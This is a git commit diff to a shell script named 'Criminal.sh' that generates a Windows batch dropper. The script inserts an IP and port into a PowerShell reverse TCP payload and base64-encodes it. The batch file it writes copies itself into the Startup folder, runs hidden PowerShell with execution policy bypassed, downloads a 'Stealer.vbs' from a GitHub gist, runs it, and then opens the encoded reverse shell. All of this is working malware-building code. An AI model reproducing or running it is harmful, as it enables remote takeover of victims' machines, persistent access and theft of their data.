b331d285419feeece05442892ea3f0339dd44dc6
darkuser744 <70851040+darkuser744@users.noreply.github.com>
2020-10-11 14:12:37 +0530

    Update Criminal.sh

--- Criminal.sh
+++ Criminal.sh
@@ -39,10 +39,9 @@ sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
 sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
 printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[0m\n"
 sleep 1
-echo -e "@echo off " >> $ps_tcp.bat
+echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
 echo -e "cd %temp%" >> $ps_tcp.bat
 echo -e '''powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile;wget -o Stealer.vbs "https://gist.githubusercontent.com/darkuser744/1b307ea87dda596ea95b3e0053f59962/raw/e039823f7e11e92d6db5f80b13b7a159eb66b22a/.txt"''' >> $ps_tcp.bat
-echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
 echo -e "start Stealer.vbs " >> $ps_tcp.bat
 echo -e "powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile -EncodedCommand " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
 echo -e "exit /b" >> $ps_tcp.bat
